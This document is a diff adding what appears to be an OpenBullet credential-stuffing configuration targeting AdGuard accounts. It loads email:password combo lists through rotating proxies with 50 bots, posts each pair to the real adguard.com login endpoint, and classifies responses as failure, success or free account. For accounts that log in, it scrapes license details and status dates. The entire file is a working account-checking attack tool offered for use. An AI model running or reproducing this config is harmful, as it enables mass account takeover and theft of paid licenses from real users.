@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "adguard",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-07T16:17:21.5472249+07:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_LOGIN REQUEST POST "https://adguard.com/en/account/login_check.html" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&Login=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, unrecognized username or password" 
+  KEYCHAIN Success OR 
+    KEY "Log Out" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Currently you don&#039;t have any license" 
+#PARSE_LICENSE PARSE "<SOURCE>" LR "class=\"table__desktop-content\">" "</span>" Recursive=TRUE -> CAP "LICENSE" "" "" 
+#PARSE_DATE PARSE "<SOURCE>" LR "table__td--status\">" "</div>" Recursive=TRUE -> CAP "DATE" "" "" 
